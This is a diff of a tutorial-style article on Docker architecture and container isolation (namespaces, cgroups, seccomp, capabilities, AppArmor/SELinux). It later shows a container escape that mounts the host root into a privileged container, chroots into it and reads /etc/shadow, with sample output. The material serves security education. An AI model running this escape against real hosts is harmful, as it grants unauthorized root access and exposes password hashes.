@@ -17,21 +17,60 @@ Docker? It's just a fancy process. Your container shares the same kernel as your
 
 When you run `docker run`, here's what actually happens:
 
-Your CLI talks to the Docker daemon through a Unix socket at `/var/run/docker.sock`. The daemon then hands things off to containerd (the high-level runtime that manages images and container lifecycle), which passes execution down to runc (the low-level runtime). Runc is where the real work happens - it talks directly to the Linux kernel to set up all the isolation.
+```mermaid
+flowchart LR
+    A[Docker CLI] -->|HTTP via| B[Unix Socket] --> C[Docker Daemon] --> D[containerd] --> E[runc] --> F[Linux Kernel]
+```
 
-The isolation itself comes from several mechanisms working together:
+Your CLI talks to the Docker daemon through a Unix socket at `/var/run/docker.sock`. Why a Unix socket and not TCP? Two reasons:
 
-**Namespaces** give each container its own view of the system. The container thinks it has its own network stack, its own process tree starting at PID 1, its own filesystem. But it's all an illusion - the kernel is just showing it a filtered view.
+1. **Security through filesystem permissions** - Unix sockets are files, so you can control access with standard file permissions. Only users in the `docker` group (or root) can read/write to the socket. With TCP, you'd need additional authentication layers.
 
-**Cgroups** limit what resources a container can consume. Without these, a container could eat all your CPU or RAM and starve the host.
+2. **No network exposure** - A Unix socket only exists on the local filesystem. There's no port to accidentally expose to the network, no firewall rules to mess up. It's local-only by design.
 
-**Seccomp** blocks dangerous syscalls. Things like `mount`, `reboot`, or `pivot_root` could let a container mess with the host, so they're filtered by default.
+The socket is essentially an HTTP API endpoint. When you run `docker ps`, your CLI is making an HTTP GET request to the daemon through that socket. When you run `docker run`, it's a POST request with container configuration as JSON. The daemon runs as root and does all the heavy lifting.
 
-**Capabilities** break root into smaller pieces. Instead of giving a process full root power, Linux defines ~40 capabilities like `CAP_NET_ADMIN` or `CAP_SYS_ADMIN`. Docker drops most of these.
+From there, the daemon hands things off to **containerd** (the high-level runtime). Containerd manages the container lifecycle - pulling images, managing storage snapshots, handling container states. It's the layer that makes containers feel like persistent objects rather than just processes.
 
-**AppArmor/SELinux** provide an additional layer of mandatory access control at the kernel level.
+Containerd then passes execution to **runc** (the low-level runtime). This is where containers actually get created. Runc talks directly to the Linux kernel to set up all the isolation primitives. It's a small, focused tool that implements the OCI runtime specification.
 
-Sounds pretty secure right? The problem is these are all software boundaries, and software boundaries can be misconfigured or bypassed.
+### The Isolation Mechanisms
+
+```mermaid
+flowchart TB
+    A[Container Process] --> B[Namespaces]
+    A --> C[Cgroups]
+    A --> D[Seccomp]
+    A --> E[Capabilities]
+    A --> F[AppArmor/SELinux]
+    B & C & D & E & F --> G[Linux Kernel]
+```
+
+**Namespaces** are the core of container isolation. Linux supports several namespace types:
+- **PID namespace** - Container sees its own process tree, with its init as PID 1
+- **NET namespace** - Container gets its own network stack, interfaces, routing tables
+- **MNT namespace** - Container has its own filesystem mount points
+- **UTS namespace** - Container can have its own hostname
+- **IPC namespace** - Isolated inter-process communication
+- **USER namespace** - Maps container UIDs to different host UIDs
+
+Each namespace makes the container think it's alone on the system. But here's the thing - the kernel still sees everything. Namespaces are just filters on what a process can see, not actual separation.
+
+**Cgroups** (control groups) handle resource limits. You can cap CPU usage, memory consumption, disk I/O, network bandwidth. Without these, a container could trivially DoS the host by consuming all resources. Cgroups also provide resource accounting - you can see exactly how much CPU/memory each container is using.
+
+**Seccomp** (secure computing mode) filters syscalls at the kernel level. Docker's default seccomp profile blocks around 44 syscalls out of 300+. Things like `reboot`, `mount`, `swapon`, `clock_settime` - syscalls that could affect the host system. If a containerized process tries to call a blocked syscall, it gets killed with SIGSYS.
+
+**Capabilities** break the monolithic root privilege into ~40 distinct capabilities. Instead of "can do everything" you get granular permissions like:
+- `CAP_NET_ADMIN` - modify network settings
+- `CAP_SYS_ADMIN` - the catch-all "almost root" capability
+- `CAP_SYS_PTRACE` - trace/debug other processes
+- `CAP_SYS_MODULE` - load kernel modules
+
+Docker drops most capabilities by default. A container running as root inside still can't do most privileged operations unless explicitly granted.
+
+**AppArmor/SELinux** are Linux Security Modules that provide mandatory access control. Even if a process is root with all capabilities, LSMs can still block actions based on security policies. They're the last line of defense when everything else fails.
+
+Sounds pretty secure right? Layer upon layer of isolation. The problem is these are all software boundaries enforced by the same kernel the container is using. Misconfigure one layer, find a bug in the kernel, or combine several "harmless" permissions - and suddenly you're on the host.
 
 ---
 
@@ -63,9 +102,16 @@ apt update && apt install -y docker.io
 
 # Spawn privileged container with host root mounted
 docker run -it -v /:/host --privileged ubuntu chroot /host
+
+# You're now root on the host
+root@host:/# ls /
+bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+
+root@host:/# cat /etc/shadow
+root:$6$xyz$...:19000:0:99999:7:::
 ```
 
-Game over. You're now root on the host.
+Game over.
 
 #### CVE-2025-9074: Docker Desktop API Exposure
 
